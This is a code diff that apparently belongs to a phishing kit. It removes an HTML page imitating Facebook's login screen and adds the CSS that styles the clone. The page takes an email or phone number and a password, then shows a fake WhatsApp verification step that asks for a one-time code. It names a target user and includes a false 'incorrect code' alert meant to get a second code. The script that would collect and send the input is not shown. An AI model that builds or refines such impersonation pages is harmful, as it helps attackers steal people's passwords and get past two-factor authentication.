@@ -1,153 +1,53 @@
-<!DOCTYPE html>
-
-<html lang="en">
-
-<head>
-
-    <meta charset="UTF-8">
-
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Facebook</title>
-
-    <link rel="stylesheet" href="styles/style.css">
-
-</head>
-
-<body>
-
-
-
-    <div id="custom-alert" class="alert-overlay">
-
-        <div class="alert-box">
-
-            <p id="alert-message">Incorrect code. We have sent you a new code.</p>
-
-            <button onclick="closeAlert()">OK</button>
-
-        </div>
-
-    </div>
-
-
-
-    <div class="main-container" id="main-wrapper">
-
-        
-
-        <div class="left-content" id="left-col">
-
-            <h1 class="logo-title">facebook</h1>
-
-            <p class="description">Facebook helps you connect and share with the people in your life.</p>
-
-            <img src="illustration.png" alt="Facebook Illustration" class="hero-image">
-
-        </div>
-
-
-
-        <div class="right-content">
-
-            
-
-            <div id="step-1">
-
-                <div class="login-card">
-
-                    <input type="text" id="phone" placeholder="Email address or phone number">
-
-                    <input type="password" id="pass" placeholder="Password">
-
-                    <button class="btn-login" onclick="nextStep()">Log In</button>
-
-                    <a href="#" class="forgot-link">Forgotten password?</a>
-
-                    <hr class="card-hr">
-
-                    <button class="btn-signup">Create new account</button>
-
-                </div>
-
-            </div>
-
-            
-
-            <div id="step-2" class="whatsapp-card" style="display: none;">
-
-                <p class="user-meta">Nguyen Trong Que • Facebook</p>
-
-                <h2 class="step-title">Check your WhatsApp messages.</h2>
-
-                <p class="step-desc">Enter the code we sent to your WhatsApp account at number *** *** ** 66.</p>
-
-
-
-                <div class="whatsapp-img-container">
-
-                    <img src="otp-image.png.jpg" alt="WhatsApp Verification" class="whatsapp-img">
-
-                </div>
-
-
-
-                <div class="input-container">
-
-                    <span class="floating-label">Code</span>
-
-                    <input type="text" id="otp-code" class="otp-input" autocomplete="off" oninput="checkOtpInput()">
-
-                </div>
-
-
-
-                <div class="resend-timer">
-
-                    <span class="icon-refresh">↻</span> We may send the new code after <strong><span id="timer">60</span>s</strong>.
-
-                </div>
-
-
-
-                <button id="btn-submit-otp" class="btn-pill btn-continue-step2" onclick="submitOtp()">Continue</button>
-
-                <button class="btn-pill btn-outline">Try another way</button>
-
-            </div>
-
-
-
-        </div>
-
-    </div>
-
-
-
-    <footer class="footer-section">
-
-        <div class="lang-list">
-
-            <span class="active-lang">English (US)</span> · <span>Español</span> · <span>Français (France)</span> · <span>中文(简体)</span> · <span>العربية</span> · <span>Português (Brasil)</span> · <button class="btn-more-lang">+</button>
-
-        </div>
-
-        <hr class="footer-hr">
-
-        <div class="link-list">
-
-            Sign Up · Log In · Messenger · Facebook Lite · Video · Places · Games · Marketplace · Meta Pay · Meta Store · Meta Quest · Instagram · Threads · Fundraisers · Services · Voting Information Center · Privacy Policy · Privacy Center · Groups · About · Create ad · Create Page · Developers · Careers · Cookies · Ad choices · Terms · Help · Contact uploading and non-users
-
-        </div>
-
-        <p class="copyright">Meta © 2026</p>
-
-    </footer>
-
-
-
-    <script src="app.js"></script>
-
-</body>
-
-</html> 
+/* --- 1. CẤU HÌNH ĐỊNH DẠNG GỐC --- */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 40px 0 20px 0; }
+
+/* --- 2. HỘP THÔNG BÁO --- */
+.alert-overlay { position: fixed !important; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.5) !important; display: none; justify-content: center; align-items: center; z-index: 999999 !important; }
+.alert-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; width: 340px; }
+.alert-box p { font-size: 16px; color: #1c1e21; line-height: 1.4; }
+.alert-box button { background-color: #1877f2; color: white; border: none; padding: 10px 40px; border-radius: 6px; font-weight: bold; font-size: 15px; margin-top: 20px; cursor: pointer; }
+
+/* --- 3. BỐ CỤC CHÍNH (FLEXBOX CHUẨN) --- */
+.main-container { display: flex; justify-content: center; align-items: center; gap: 40px; width: 100%; max-width: 1000px; padding: 20px; flex-grow: 1; }
+.main-container.only-step2 { justify-content: center !important; max-width: 500px !important; }
+.main-container.only-step2 #left-col { display: none !important; }
+
+/* --- CỘT TRÁI (HÌNH ẢNH) --- */
+.left-content { flex: 1 1 500px; max-width: 560px; padding-top: 40px; }
+.logo-title { font-size: 60px; color: #1877f2; font-weight: bold; letter-spacing: -1px; margin-bottom: 5px; }
+.description { font-size: 24px; line-height: 28px; color: #1c1e21; margin-bottom: 20px; }
+.hero-image { width: 100%; max-width: 440px; height: auto; }
+
+/* --- CỘT PHẢI (KHUNG ĐĂNG NHẬP CHUẨN) --- */
+.right-content { flex: 0 0 396px; width: 396px; }
+.login-card, .whatsapp-card { background: white; padding: 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 100%; }
+.login-card { text-align: center; }
+#step-1 input { width: 100%; padding: 14px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; outline: none; }
+.btn-login { width: 100%; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; padding: 12px; margin-top: 10px; cursor: pointer; }
+.forgot-link { display: block; color: #1877f2; font-size: 14px; text-decoration: none; margin-top: 16px; }
+.card-hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
+.btn-signup { background-color: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; padding: 12px 16px; cursor: pointer; }
+
+/* --- BƯỚC 2: WHATSAPP CARD --- */
+.whatsapp-card { text-align: left; padding: 24px; }
+.step-title { font-size: 20px; font-weight: 700; color: #050505; margin-bottom: 6px; }
+.step-desc { font-size: 14px; color: #1c1e21; margin-bottom: 16px; line-height: 1.4; }
+.whatsapp-img { width: 100%; height: auto; display: block; object-fit: cover; }
+.otp-input { width: 100%; padding: 22px 12px 6px 12px; border: 1px solid #ccd0d5; border-radius: 6px; font-size: 16px; outline: none; }
+.btn-pill { width: 100%; padding: 12px; border-radius: 24px; font-weight: 600; font-size: 15px; text-align: center; border: none; display: block; text-decoration: none; }
+.btn-continue-step2 { background-color: #cbdcf7; color: white; }
+.btn-continue-step2.active { background-color: #1877f2; cursor: pointer; }
+
+/* --- 4. PHẦN CHÂN TRANG --- */
+.footer-section { width: 100%; max-width: 1000px; margin-top: 40px; font-size: 12px; color: #737373; line-height: 1.6; text-align: left; padding: 0 20px; }
+.lang-list span:hover { text-decoration: underline; }
+.footer-hr { border: none; border-top: 1px solid #dddfe2; margin: 8px 0; }
+
+/* --- 5. ĐÁP ỨNG (RESPONSIVE) --- */
+@media (max-width: 1050px) { .main-container { gap: 20px; } .left-content { flex: 1 1 300px; } .right-content { flex: 0 0 350px; width: 350px; } }
+@media (max-width: 768px) { body { background-color: #fff; justify-content: flex-start; padding: 16px; } .main-container { flex-direction: column; align-items: center; gap: 16px; padding: 0; } .left-content { display: none !important; } .right-content { width: 100%; max-width: 440px; flex: 0 0 auto; } .login-card, .whatsapp-card { box-shadow: none; border: none; background: transparent; padding: 0; } .footer-section { text-align: center; margin-top: 40px; } }
+.main-container.only-step2 ~ .footer-section { display: none !important; }
+
+/* --- HIỆU ỨNG MỜ NÚT --- */
+.disabled-btn { opacity: 0.5 !important; cursor: not-allowed !important; pointer-events: none !important; }
